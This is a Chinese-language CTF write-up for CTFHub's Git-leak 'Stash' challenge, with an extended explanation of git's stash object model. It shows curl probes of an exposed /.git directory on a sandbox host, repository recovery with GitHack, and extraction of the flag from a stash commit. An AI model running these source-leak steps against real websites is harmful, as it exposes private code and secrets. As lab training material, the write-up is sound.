# CTFHub · Git 泄露 - Stash

> 靶场：CTFHub 技能树 · 信息泄露 · Git 泄露 · Stash
> 实例：`challenge-f853c2afa0df69bb.sandbox.ctfhub.com:10800`
> 日期：2026-10-18
> 考点：**`git stash` 的对象模型 + 合并提交的 diff 规则**

---

## 一、题目

```
http://challenge-f853c2afa0df69bb.sandbox.ctfhub.com:10800/

首页：<title>CTFHub .git leakage</title>   <h1>Where is flag?</h1>
```

**没有任何附件。** 首页只说"flag 在哪"，说明考点在服务端留下的东西。

---

## 二、发现过程

### 1. 探测：先分清是哪家版本库

```bash
T="http://challenge-f853c2afa0df69bb.sandbox.ctfhub.com:10800"

curl -s  "$T/.git/HEAD"                                        # git 入口
curl -s  "$T/.git/logs/HEAD"                                   # 提交历史
curl -s  "$T/.git/refs/stash"                                  # ★ stash 入口
curl -s  "$T/.git/logs/refs/stash"                             # ★ stash 操作记录
curl -s  "$T/.git/index"                                       # 暂存区
curl -s -o /dev/null -w "%{http_code}\n" "$T/.git/objects/"    # 走哪条路线
```

**返回：**

| 路径 | 状态 | 大小 | 说明 |
|---|---|---|---|
| `/.git/HEAD` | 200 | 23 | `ref: refs/heads/master` |
| `/.git/logs/HEAD` | 200 | 590 | 4 条记录 |
| **`/.git/refs/stash`** | **200** | **41** | **有 stash → Stash 题** |
| `/.git/logs/refs/stash` | 200 | 159 | `WIP on master: 71a0ca8 add flag` |
| `/.git/index` | 200 | 217 | 2 个条目（50x.html / index.html） |
| `/.git/objects/` | **403** | — | 不能列目录 → 走 GitHack |
| `/.svn/entries` | 404 | — | 不是 SVN |
| `/.hg/requires` | 404 | — | 不是 HG |

### 2. 为什么 `refs/stash` 是判据

```
refs/heads/master   → 分支（每个仓库都有，不能作判据）
refs/stash          → stash 栈顶（只有 stash 过才有）★
refs/tags/*         → 标签
```

**⚠️ 常见误判：看到 `/.git/index` 返回 200 就以为是 Index 题。**

**`.git/index` 是每个 git 仓库都有的文件，它的存在不能说明任何题型。** 本题的 index 里只有 `50x.html` / `index.html` 两个普通文件，没有 flag。

### 3. reflog 里的关键信息

```
0000...0000  167bdabc...  commit (initial): init
167bdabc...  71a0ca82...  commit: add flag
71a0ca82...  71a0ca82...  reset: moving to HEAD        ← 旧=新，reset 但没改指向
71a0ca82...  1bccfa10...  commit: remove flag
```

**第 3 行很可疑**：`71a0ca8 → 71a0ca8`（旧新相同）= 执行过 `git reset` 但 HEAD 没动。
「add flag 之后马上 reset，再 remove flag」—— 说明中间有过未提交的改动被处理掉了。

而 `logs/refs/stash` 直接给出了答案：

```
0000...0000  175c8be2...  WIP on master: 71a0ca8 add flag
                                    └───┬───┘ └──┬──┘
                                stash 时的分支   stash 基于哪个提交
```

**stash 是基于 `71a0ca8`（add flag）做的** —— 说明当时工作区里已经有 flag 了。

---

## 三、搬运

`objects/` 是 **403**，`wget -r` 爬不到，走 GitHack：

```bash
cd ~/tools/githack/GitHack-master
python2 GitHack.py "$T/.git"
```

```
[*] logs/refs/stash
[*] refs/stash
[*] Fetch Commit Objects
[*] objects/17/5c8be2a1...   ← stash 本体
[*] objects/51/af520153...   ← stash 的 tree
[*] objects/04/abb0e29c...   ← stash 的 parent 2（index 提交）
[*] objects/59/c26cabd9...   ← ★ flag 所在的 blob
[+] Clone Success. Dist File : .../dist/challenge-f853c2afa0df69bb.sandbox.ctfhub.com_10800
```

**GitHack 的固定清单里本来就包含 `refs/stash` 和 `logs/refs/stash`**，所以 Stash 题它能完整还原。

---

## 四、两条错误路径（我实际走的）

### 错误 A：以为 flag 在 "add flag" 那次提交里

```bash
$ git show 71a0ca82d3c3df1ab716897ecc68
commit 71a0ca82d3c3df1ab716897ecc68c319246f0847
    add flag

diff --git a/24766100228235.txt b/24766100228235.txt
new file mode 100644
--- /dev/null
+++ b/24766100228235.txt
@@ -0,0 +1 @@
+where is flag          ← 假线索！
```

**出题人把 "add flag" 做成了诱饵** —— 文件名像 flag（`24766100228235.txt`），内容是占位文字 `where is flag`。

**教训**：`git log` 里的 message（`add flag` / `remove flag`）是**出题人编的**，不能当事实。

### 错误 B：以为可以从前端访问那个文件

```bash
$ curl "$T/24766100228235.txt"
<html><head><title>404 Not Found</title></head>...    ← 404
```

**服务器上根本没有这个文件** —— 它只存在于 git 的对象库里。

**教训**：`.git/objects/` 里的内容**不会**通过网站路径暴露。想读它必须经过 git 对象层。

---

## 五、正确路径

```bash
$ git stash list
stash@{0}: WIP on master: 71a0ca8 add flag
```

发现 stash 后，`pop` 出来：

```bash
$ git stash pop
CONFLICT (modify/delete): 24766100228235.txt deleted in Updated upstream
        and modified in Stashed changes.
        Version Stashed changes of 24766100228235.txt left in tree.
Unmerged paths:
        deleted by us:   24766100228235.txt

The stash entry is kept in case you need it again.
```

**冲突但文件被保留在工作区** → 直接读：

```bash
$ cat 24766100228235.txt
ctfhub{03f0f3f844084d7134cedad3}
```

---

## 六、原理

### 6.1 stash 的对象模型：它是**三合一合并提交**

```bash
$ git cat-file -p refs/stash
tree 51af520153269f68b168d22bddeed587078dd306
parent 71a0ca82...     ← 父 1：stash 时的 HEAD
parent 04abb0e2...     ← 父 2：index 快照
                        （有 untracked 时还会有父 3）

WIP on master: 71a0ca8 add flag
```

```
167bdab (init)
   ↓
71a0ca8 (add flag)  ←──────┬───────────────┐
   ↓                       │               │
1bccfa1 (remove flag)      │               │
 = refs/heads/master       │               │
                       04abb0e          175c8be
                   index on master    WIP on master
                   （暂存区快照）      （工作区快照）★ flag
                         └───────┬───────┘
                        175c8be 的 parent 2
```

| commit | message | 存什么 | 有 flag |
|---|---|---|---|
| `175c8be` | `WIP on master: ...` | **工作区**快照 | ✅ |
| `04abb0e` | `index on master: ...` | **暂存区**快照 | ❌ |
| `71a0ca8` | `add flag` | 已提交内容（`where is flag`） | ❌ |

**为什么 stash 要设计成合并提交**：一个 commit 只有一个 tree，而要同时保存"工作区 / 暂存区 / 未跟踪"三份快照，只能靠多个父来挂。

### 6.2 为什么 `git log --all -p | grep` 抓不到

**实测：**

```
stash@{0} 的父数: 2                ← 合并提交
git log -p      看到 stash 的 diff: 0 行    ❌
git log -p -m   看到 stash 的 diff: 4 行    ✅
```

**git 的规则：**

```
普通提交（1 个父）:  diff = 相对父提交 → -p 会输出
合并提交（2+ 个父）: 相对哪个父？没唯一答案 → -p 默认【不输出】
                    需要显式 -m / -c / --cc
```

**所以上一题好用的 `git log --all -p | grep`，在这一题完全失效。**

### 6.3 `git stash show -p` 等价于什么（实测 md5 相同）

```
git stash show -p          md5: 430dee1ff8503d922d4a02cfd3eb2c3d
git diff 'stash@{0}^1' 'stash@{0}'   md5: 430dee1ff8503d922d4a02cfd3eb2c3d
git diff 'stash@{0}^2' 'stash@{0}'   md5: 430dee1ff8503d922d4a02cfd3eb2c3d
                                    ↑ 本题暂存区没改动，所以 ^1 和 ^2 的 tree 相同
```

**原理**：拿 stash 本体的 tree 和 **parent 1** 的 tree 对比 → 就是"工作区相对 HEAD 改了什么"。

### 6.4 tree 是**快照**，不是**差异**

```bash
$ git ls-tree -r 'stash@{0}'
100644 blob 59c26cab...  24766100228235.txt    ← 真 flag
100644 blob 9071e0a2...  50x.html
100644 blob 2c59e302...  index.html

$ git ls-tree -r 'stash@{0}^1'
100644 blob e358b09f...  24766100228235.txt    ← "where is flag"
100644 blob 9071e0a2...  50x.html
100644 blob 2c59e302...  index.html
```

**两个 tree 都有同名文件，但 blob 哈希不同** —— git 存的是每个版本的**完整内容**，`git diff` 只是现算出来给人看。

**所以 flag 从来不是"被删除又恢复"，而是"两个版本都在对象库里，只是其中一个没有 ref 指向它"。**

### 6.5 `git stash pop` 为什么必然冲突

**三方合并：**

```
        base              ours              theirs
      71a0ca8           1bccfa1           175c8be
    "add flag"        "remove flag"     "WIP on master"
        │                 │                 │
    文件存在           文件被删           文件被改
 "where is flag"                        = flag
        ↓
    删 vs 改 → modify/delete 冲突，git 无法自动决定
```

**git 的处理**：保留 stash 那一版在工作区（删数据比留数据危险），并把 stash 条目留着（`The stash entry is kept`）。

**出题人是故意的**：先让文件被"修改"并 stash，再提交一次"删除"，任何 `pop` / `apply` 都必然冲突。

---

## 七、附录

### A1. 三种读法对比（都不改工作区）

| # | 命令 | 输出 | 会冲突吗 |
|---|---|---|---|
| 1 | `git stash show -p` | diff 形式（± 行） | ❌ |
| 2 | `git show 'stash@{0}:24766100228235.txt'` | **文件原文** | ❌ |
| 3 | `git ls-tree -r refs/stash` + `git cat-file -p <blob>` | **最底层** | ❌ |
| 4 | `git stash pop` | 恢复到工作区 | ✅ **会冲突** |

**CTF 里首选 1~3，别用 4。**

### A2. 判据速查

| 检查 | 值 | 结论 |
|---|---|---|
| `/.git/refs/stash` | **200** | **Stash 题** |
| `/.git/logs/refs/stash` | 200 | stash 的历史（能看出基于哪个提交） |
| `/.git/index` | 200 | ⚠️ **不能作判据**，每个仓库都有 |
| `/.git/objects/` | 200 / 403 | 200 用 `wget -r`，403 用 GitHack |

### A3. 踩坑记录

| 现象 | 原因 | 解决 |
|---|---|---|
| `python: can't open file 'GitHack.py'` | 没 `cd` 进工具目录 | 先 `cd ~/tools/githack/GitHack-master` |
| 同上 | 用了 `python` 而非 `python2` | GitHack 是 Py2 代码 |
| `git show <add flag>` 只看到 `where is flag` | **出题人的诱饵** | 转向 stash |
| `curl $T/xxx.txt` → 404 | 文件只在 git 对象里 | 必须经 git 对象层 |
| `git log --all -p \| grep` 抓不到 | stash 是合并提交，`-p` 跳过 | 用 `git stash show -p` 或加 `-m` |
| `git stash pop` 冲突 | 删/改冲突，出题人故意设计 | 文件已 `left in tree`，直接 `cat` |

### A4. 完整命令清单

```bash
T="http://challenge-f853c2afa0df69bb.sandbox.ctfhub.com:10800"

# ── 探测 ──
curl -s "$T/.git/HEAD"
curl -s "$T/.git/logs/HEAD"
curl -s "$T/.git/refs/stash"            # ★ 判据
curl -s "$T/.git/logs/refs/stash"
curl -s -o /dev/null -w "%{http_code}\n" "$T/.git/objects/"

# ── 搬运 ──
cd ~/tools/githack/GitHack-master
python2 GitHack.py "$T/.git"
cd dist/challenge-f853c2afa0df69bb.sandbox.ctfhub.com_10800

# ── 挖 ──
git stash list
git stash show -p                        # ← 直接出 flag

# 或者（不改工作区）
git show 'stash@{0}:24766100228235.txt'
```

**flag：`ctfhub{03f0f3f844084d7134cedad3}`**
